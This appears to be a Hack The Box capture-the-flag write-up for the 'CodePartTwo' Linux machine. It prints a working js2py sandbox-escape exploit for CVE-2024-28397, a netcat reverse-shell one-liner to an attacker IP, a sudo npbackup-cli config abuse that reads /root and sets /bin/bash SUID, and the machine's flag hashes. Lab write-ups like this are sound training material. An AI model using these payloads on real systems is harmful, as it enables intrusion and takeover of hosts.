---
layout: post
title:  "Hack The Box - CodePartTwo"
description: A Hack The Box Boot2Root Challenge Rated Easy
tags: HackTheBox Linux Boot2Root Easy
media_subpath: /assets/img/writeups/HackTheBox/CodePartTwo/
image:
  path: CodePartTwo.png
---

## At a glance

| Item                 | Details   |
| -------------------- | --------- |
| **Type**             | Boot2Root |
| **Difficulty**       | Easy      |
| **Operating System** | Linux     |

## Recon

* **Passive**: tech stack, endpoints, robots, JS routes, third‑party assets
* **Active**: directory brute‑force, API discovery, parameter mining

```bash
# Check for any open port
nmap 10.150.150.27
```

![nmap result](nmap_result.png)

From this result, this shows two port open which is `22` for `SSH` and `8000` for `HTTP`.

## Web Exploitation

From this, we directly go to the web application.

![web landing page](web_landing_page.png)

Then we proceed to register and login.

![web dashboard](web_dashboard.png)

From this dashboard there are couple of function to be highlighted.

1. **Run Code**
2. **Saved Code**

From both this function, we suspected that **Run Code** could be escalated to **RCE** but no hope yet. We then trying many way to escalate it but no luck found.

![play around with code](play_around_with_code.png)

After we stuck a little bit, we realize that we can **download** the **source code** in the **landing page**.

### Source Code Reviewing

After some source code reviewing, there are two thing that we can highlight.

```python
import js2py
.
.
.
js2py.disable_pyimport()
.
.
.
@app.route('/run_code', methods=['POST'])
def run_code():
  try:
      code = request.json.get('code')
      result = js2py.eval_js(code)
      return jsonify({'result': result})
  except Exception as e:
      return jsonify({'error': str(e)})
.
.
.
```
{: file="app.py"}

From this code we realize two things.

1. This code possible to perform RCE (The code is not client side execution)
2. js2py.disable_pyimport() Attempt to prevent RCE

Then we check the version of js2py

```text
js2py==0.74
```
{: file="requirements.txt"}

From this, we already can proceed to the next step of confirming **Command Execution**.

## Command Execution

From the version we realize that this vulnerable to **CVE 2024-28397**. This allow attacker to obtain a **reference** to a **python object**. Then the attacker can **escape JS environment** to **execute arbitrary command** on the host.

Refer here for the [PoC](https://github.com/waleed-hassan569/CVE-2024-28397-command-execution-poc/tree/main)

```js
let cmd = "id"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

// run the command and force UTF-8 string output
let proc = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)
let out = proc.communicate()[0].decode("utf-8")

// return a plain string (JSON-safe)
"" + out
```

![Code Execution PoC](Code_execution_PoC.png)

## Foothold (Initial Access)

From the command, we directly perform reverse shell to ease our work. As always, I refer to [RevShells](https://www.revshells.com/).

In this case, I use `nc mkfifo`.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1337 >/tmp/f
```

As always, we proceed stabilize the shell.

![Stable shell](stable_shell.png)

Then, after we play around and found something useful.

![Interesting content](interesting_content.png)

As shows above, the same user is available in both server and the web application. from this we try to crack the password using [CrackStation](https://crackstation.net/).

![Crackstation Password](crackstation_password.png)

Then, to ease the process we just ssh into the marco user.

![Marco SSH](marco_ssh.png)

From that, we just read the user.txt for the first flag.

![User Flag](user_flag.png)

> **27eaf42089f712c871ff75694b2cd9bc**

## Privilege Escalation

To start with this challenge, we start with basic sudo command.

```bash
sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

From this, we know that marco can **execute npbackup-cli as sudo**. So we need to understand what this capable of.

```bash
marco@codeparttwo:~$ ls -la /usr/local/bin/npbackup-cli
-rwxr-xr-x 1 root root 393 Jun 11 08:47 /usr/local/bin/npbackup-cli
```

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```
{: file="/usr/local/bin/npbackup-cli"}

From this code, we know that we can't edit the npbackup-cli. So we proceed to search online for any possible solution until I found that we can read file through npbackup-cli through config in npbackup.conf [reference](https://github.com/AliElKhatteb/npbackup-cli-priv-escalation/tree/main).

So we edit the config and add what we want.

```bash
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
marco@codeparttwo:~$ cp npbackup.conf .
cp: 'npbackup.conf' and './npbackup.conf' are the same file
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
marco@codeparttwo:~$ cp npbackup.conf escalate.conf
```

```conf
.
.
.
    backup_opts:
    - /root/
.
.
.
```
{: file="escalate.conf"}

Then we can read all the content in `/root/` folder thus we can directly read /root/root.txt.

```bash
sudo /usr/local/bin/npbackup-cli -c escalate.conf --backup
sudo /usr/local/bin/npbackup-cli -c escalate.conf --dump /root/root.txt --snapshot-id {snapshot-id}
```

![Read Root Flag](read_root_flag.png)

> **a1162be8254044b65e95e148eff01934**

This is already complete the challenge through getting the root flag.

### Root Shell

As note, we can gain root shell through the `pre_exec_commands` value in the configuration file.

```conf
.
.
.
pre_exec_commands: "chmod 4755 /bin/bash"
```
{: file="escalate.conf"}

Then just execute the commands below.

```bash
sudo /usr/local/bin/npbackup-cli -c escalate.conf --backup
/bin/bash -p
```

![Root Shell](root_shell.png)
